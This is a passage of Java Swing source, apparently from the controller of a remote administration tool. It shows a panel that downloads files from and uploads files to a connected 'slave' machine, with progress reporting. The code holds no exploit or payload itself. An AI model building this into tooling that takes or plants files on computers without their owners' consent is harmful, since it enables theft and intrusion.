					slave.addToSendQueue(new Packet21GetFile(file));
				}
			}
		}
	}

	public void upload() {
		FrameFileTransfer frame = FrameFileTransfer.instance;
		if (FrameFileTransfer.instance == null) {
			frame = new FrameFileTransfer();
		}
		frame.setVisible(true);

		final FrameFileTransfer finalFrame = frame;

		final List<File> files = new ArrayList<File>();

		int[] rows = tableme.getSelectedRows();
		for (int row : rows) {
			String val = modelme.getValueAt(row, 0).toString();
			if (modelme.getValueAt(row, 1).toString().length() > 0) {
				FrameFileTransfer.instance.load(val);
				files.add(new File(val));
			}
		}

		if (rows.length > 0 && txtDir.getText() != null) {
			new Thread() {
				public void run() {
					for (File file : files) {
						SendFile.sendFile(slave, file, txtDir.getText());
					}
					JOptionPane.showMessageDialog(null, "All file transfers were done successfully.", "Success", JOptionPane.INFORMATION_MESSAGE);
					if (finalFrame != null) {
						finalFrame.reset();
					}
				}
			}.start();
		}

	}

	public void txtChanged() {
		File dir = new File(txtDir.getText());
		if (FileBookmarks.getGlobal().contains(dir)) {
			txtDir.setForeground(Color.red);
		} else {
			txtDir.setForeground(Color.black);
		}
	}

	public void start() {
		progressBar.setVisible(true);
		progressBar.setValue(0);
		label.setText("");
		label.setVisible(true);
	}

	public void reportProgress(String path, int i, int bytes, int all) {
		try {
			progressBar.setValue(i);
		} catch (Exception ex) {

		}
		label.setText("Transferring " + new File(path).getName() + " " + (bytes / 1024) + "/" + (all / 1024) + " kB");
	}

	public void done() {
		label.setVisible(false);
		progressBar.setVisible(false);
	}

	public static void addPopup(Component component, final JPopupMenu popup) {
		component.addMouseListener(new MouseAdapter() {
			@Override
			public void mousePressed(MouseEvent e) {
				if (e.isPopupTrigger()) {
					showMenu(e);
				}
			}

			@Override
			public void mouseReleased(MouseEvent e) {
				if (e.isPopupTrigger()) {
					showMenu(e);
				}
			}

			private void showMenu(MouseEvent e) {
				popup.show(e.getComponent(), e.getX(), e.getY());
			}
		});
	}
}